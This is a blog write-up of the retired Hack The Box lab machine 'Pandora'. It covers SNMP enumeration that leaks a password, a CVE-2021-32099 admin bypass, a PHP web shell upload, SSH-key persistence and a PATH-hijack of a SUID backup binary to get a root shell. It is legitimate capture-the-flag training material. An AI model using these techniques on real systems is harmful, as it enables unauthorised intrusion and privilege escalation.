
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark)"
    href="../../theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark)"
          href="../../theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
          href="../../theme/pygments/sas.min.css">


  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">


    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">



  


 

<meta name="author" content="maggick" />
<meta name="description" content="This box is a writeup about a retired HacktheBox machine: Pandora publish on January 8, 2022 by TheCyberGeek and dmw0ng. This box is rated as an easy machine. It implies an UDP service, a localy exposed vulnerable application and an SUID binary." />
<meta name="keywords" content="security, boot2root, HTB, suid, snmp, pandora">


  <meta property="og:site_name" content="maggick's logs"/>
  <meta property="og:title" content="HTB: Pandora"/>
  <meta property="og:description" content="This box is a writeup about a retired HacktheBox machine: Pandora publish on January 8, 2022 by TheCyberGeek and dmw0ng. This box is rated as an easy machine. It implies an UDP service, a localy exposed vulnerable application and an SUID binary."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="../../2022/05/htb-pandora.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2022-05-25 14:25:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="../../author/maggick.html">
  <meta property="article:section" content="security"/>
  <meta property="article:tag" content="security"/>
  <meta property="article:tag" content="boot2root"/>
  <meta property="article:tag" content="HTB"/>
  <meta property="article:tag" content="suid"/>
  <meta property="article:tag" content="snmp"/>
  <meta property="article:tag" content="pandora"/>
  <meta property="og:image" content="https://maggick.fr/media/image.png">

  <title>maggick's logs &ndash; HTB: Pandora</title>

</head>
<body >
  <aside>
    <div>
      <a href="../../">
        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
      </a>

      <h1>
        <a href="../../">maggick's logs</a>
      </h1>

<p>Offensive security tales</p>

      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="../../pages/about.html">
                  About
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/notes.html">
                  Notes
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/tools.html">
                  Tools
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
              <i class="fab fa-github"></i>
            </a>
          </li>
          <li>
            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
          <li>
            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
              <i class="fab fa-stack-overflow"></i>
            </a>
          </li>
          <li>
            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
              <i class="fas fa-rss"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="../../">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="htb-pandora">HTB: Pandora</h1>
    <p>
      Posted on 25 May 2022 in <a href="../../category/security.html">security</a>

        &#8226; 5 min read
    </p>
  </header>


  <div>
    <p><img class="align-left" src="/media/2022.05/pandora_card.png" alt="Pandora Card" width="262"></p>
<p>This box is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/423">Pandora</a> publish on
January 8, 2022 by
<a href="https://www.hackthebox.com/home/users/profile/114053">TheCyberGeek</a> and
<a href="https://www.hackthebox.com/home/users/profile/610173">dmw0ng</a>.
This box is rated as an easy machine. It implies an UDP service, a localy
exposed vulnerable application and an SUID binary.</p>


<h1>Foothold and user</h1>
<h2>Recon</h2>
<p>Let us start as always by a <code>nmap</code> scan. Only port 80 (HTTP) and 22 (SSH) are
open.</p>
<div class="highlight"><pre><span></span><code># Nmap 7.92 scan initiated Sat Feb  5 11:08:18 2022 as: nmap -p- -oN notes.md -sSV 10.129.157.82
Nmap scan report for 10.129.157.82
Host is up (0.014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div>

<p>Looking at the web pages we do no find anything useful. We run an UDP scan and
found that port 161 (SNMP) is open.</p>
<div class="highlight"><pre><span></span><code># Nmap 7.92 scan initiated Sat Feb 27 10:34:49 2022 as: nmap -sSU -oN udp_scan 10.129.148.185
Nmap scan report for panda.htb (10.129.148.185)
Host is up (0.013s latency).
Not shown: 998 closed udp ports (port-unreach), 998 closed tcp ports (reset)
PORT    STATE         SERVICE
22/tcp  open          ssh
80/tcp  open          http
68/udp  open|filtered dhcpc
161/udp open          snmp
</code></pre></div>

<h2>SNMP service</h2>
<p>We use <a href="https://github.com/trailofbits/onesixtyone">onesixtyone</a> to found the
community string. Only <code>public</code> seems to be available.</p>
<div class="highlight"><pre><span></span><code>└─$ onesixtyone 10.129.148.185 -c wordlist-common-snmp-community-strings.txt
Scanning 1 hosts, 122 communities
10.129.148.185 [public] Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
10.129.148.185 [public] Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
</code></pre></div>

<p>We use the <code>snmp_enum</code> module of <code>msfconsole</code> to enumerate the SNMP information.
And found that a process that is using a username and a password in the command
line.</p>
<div class="highlight"><pre><span></span><code>msf6 auxiliary(scanner/snmp/snmp_enum) &gt; show options

Module options (auxiliary/scanner/snmp/snmp_enum):

  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  COMMUNITY  public           yes       SNMP Community String
  RETRIES    1                yes       SNMP Retries
  RHOSTS     10.129.148.185   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wi
                                        ki/Using-Metasploit
  RPORT      161              yes       The target port (UDP)
  THREADS    1                yes       The number of concurrent threads (max one per host)
  TIMEOUT    1                yes       SNMP Timeout
  VERSION    1                yes       SNMP Version &lt;1/2c&gt;


msf6 auxiliary(scanner/snmp/snmp_enum) &gt; run

[+] 10.129.148.185, Connected.

[*] System information:

Host IP           : 10.129.148.185
Hostname          : pandora
Description       : Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
Contact           : Daniel
&lt;SNIP&gt;
984  runnable  sh  /bin/sh  -c sleep 30; /bin/bash -c &#39;/usr/bin/host_check -u daniel -p HotelBabylon23&#39;
&lt;SNIP&gt;
</code></pre></div>

<h2>Pandora</h2>
<p>We test this credentials on the SSH service and they are working. We check this
<code>host_check</code> process and found that a web application is exposed on locally.</p>
<div class="highlight"><pre><span></span><code>ssh daniel@10.129.148.185  # HotelBabylon23
daniel@pandora:~$ ltrace /usr/bin/host_check -u daniel -p HotelBabylon23
puts(&quot;PandoraFMS host check utility&quot;PandoraFMS host check utility
)                                                                                                             = 30
puts(&quot;Now attempting to check PandoraF&quot;...Now attempting to check PandoraFMS registered hosts.
)                                                                                                       = 53
puts(&quot;Files will be saved to ~/.host_c&quot;...Files will be saved to ~/.host_check
)                                                                                                       = 37
system(&quot;/usr/bin/curl &#39;http://127.0.0.1/&quot;... &lt;no return ...&gt;
--- SIGCHLD (Child exited) ---
&lt;... system resumed&gt; )                                                                                                                            = 0
sleep(1775726^C &lt;no return ...&gt;
--- SIGINT (Interrupt) ---
+++ killed by SIGINT +++
daniel@pandora:~$ curl http://127.0.0.1/
&lt;meta HTTP-EQUIV=&quot;REFRESH&quot; content=&quot;0; url=/pandora_console/&quot;&gt;
</code></pre></div>

<p>We mount a SSH tunnel <code>ssh daniel@10.129.148.185 -D 9090</code> and add the SOCKS
proxy in the Burp options and browse to <code>127.0.0.1</code>. We found out that the
application is Pandora FMS v7.0NG. Looking for exploit on Google we found out a
<a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained">Sonarsource blog article</a></p>
<p>As we do not have any account (daniel's can only use the API) we are looking for
a <a href="https://github.com/zjicmDarkWing/CVE-2021-32099">PoC for CVE-2021-32099 on github</a>
this seems to be a PoC specially crafted for HTB.
We copy the URL and add our session cookie at the end of it, allowing us to get
an admin access to the application.</p>
<p><img alt="Admin account" src="/media/2022.05/pandora_01.png"></p>
<p>Using the "File manager" in "admin tools", we are able to upload
<code>/usr/share/webshells/php/simple-backdoor.php</code> on the application. The page tell
us that we are uploading in <code>images</code>.</p>
<p><img alt="File upload" src="/media/2022.05/pandora_02.png"></p>
<p>We can then access <code>http://127.0.0.1/pandora_console/images/simple-backdoor.php?cmd=id</code>
to run the <code>id</code> command on the box and get the expected result:
<code>uid=1000(matt) gid=1000(matt) groups=1000(matt)</code></p>
<p>We create a <code>.ssh</code> folder in matt's home directory and put our SSH public key in
the <code>authorized_keys</code> file. We are now able to connect to the box as <code>matt</code> and
grab the user flag.</p>
<div class="highlight"><pre><span></span><code>ssh matt@10.129.156.46
matt@pandora:~$ cat user.txt
0922da287177a016913cb69eb003c0d8
</code></pre></div>

<h1>Root</h1>
<p>We start our enumeration and look for SUID binaries and found a binary called
<code>pandora_backup</code>.</p>
<div class="highlight"><pre><span></span><code>matt@pandora:/$ find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;
-rwsr-xr-x 1 root root 166056 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec
-rwsr-xr-x 1 root root 85064 Jul 14  2021 /usr/bin/chfn
-rwsr-xr-x 1 root root 44784 Jul 14  2021 /usr/bin/newgrp
-rwsr-xr-x 1 root root 88464 Jul 14  2021 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39144 Jul 21  2020 /usr/bin/umount
-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup
-rwsr-xr-x 1 root root 68208 Jul 14  2021 /usr/bin/passwd
-rwsr-xr-x 1 root root 55528 Jul 21  2020 /usr/bin/mount
-rwsr-xr-x 1 root root 67816 Jul 21  2020 /usr/bin/su
-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 53040 Jul 14  2021 /usr/bin/chsh
</code></pre></div>

<p>Looking at the calls from this binary, we can see that it call <code>tar</code> with a
relative PATH.</p>
<div class="highlight"><pre><span></span><code>matt@pandora:/$ ltrace /usr/bin/pandora_backup
getuid()                                                               = 1000
geteuid()                                                              = 1000
setreuid(1000, 1000)                                                   = 0
puts(&quot;PandoraFMS Backup Utility&quot;PandoraFMS Backup Utility
)                                      = 26
puts(&quot;Now attempting to backup Pandora&quot;...Now attempting to backup PandoraFMS client
)                            = 43
system(&quot;tar -cvf /root/.backup/pandora-b&quot;...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
&lt;no return ...&gt;
--- SIGCHLD (Child exited) ---
&lt;... system resumed&gt; )                                                 = 512
puts(&quot;Backup failed!\nCheck your permis&quot;...Backup failed!
Check your permissions!
)                           = 39
+++ exited (status 1) +++
</code></pre></div>

<p>The use of a relative PATH allow us to use a custom PATH to execute a custom
<code>tar</code> that will just spawn a root shell.</p>
<div class="highlight"><pre><span></span><code>matt@pandora:~$ mktemp -d
/tmp/tmp.yHz9XgyjVw
matt@pandora:~$ echo &#39;/bin/bash&#39; &gt; /tmp/tmp.yHz9XgyjVw/tar
matt@pandora:~$ export PATH=/tmp/tmp.yHz9XgyjVw:$PATH
matt@pandora:~$ chmod +x /tmp/tmp.yHz9XgyjVw/tar
matt@pandora:~$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:~# id
uid=0(root) gid=1000(matt) groups=1000(matt)
root@pandora:~# cat /root/root.txt
8975a2739d6bc02170645feb6607b6db
</code></pre></div>

<h1>Wrapping up</h1>
<p>A nice box with a really interesting user part with multiple stage, the UDP
service is easy to miss as there is not a lot of boxes with them and the UDP
scan are pretty slow. The chaining of different vulnerabilities in the Pandora
application is also interesting. Finally the root part is trivial.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="../../tag/security.html">security</a>
      <a href="../../tag/boot2root.html">boot2root</a>
      <a href="../../tag/htb.html">HTB</a>
      <a href="../../tag/suid.html">suid</a>
      <a href="../../tag/snmp.html">snmp</a>
      <a href="../../tag/pandora.html">pandora</a>
    </p>
  </div>


  <div class="neighbors">
    <a class="btn float-left" href="../../2022/04/htb-backdoor.html" title="HTB: Backdoor">
      <i class="fa fa-angle-left"></i> Previous Post
    </a>
    <a class="btn float-right" href="../../2022/06/forgot-username.html" title="Forgot username?">
      Next Post <i class="fa fa-angle-right"></i>
    </a>
  </div>



</article>

    <footer>
<p>
  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="../../theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>

</body>
</html>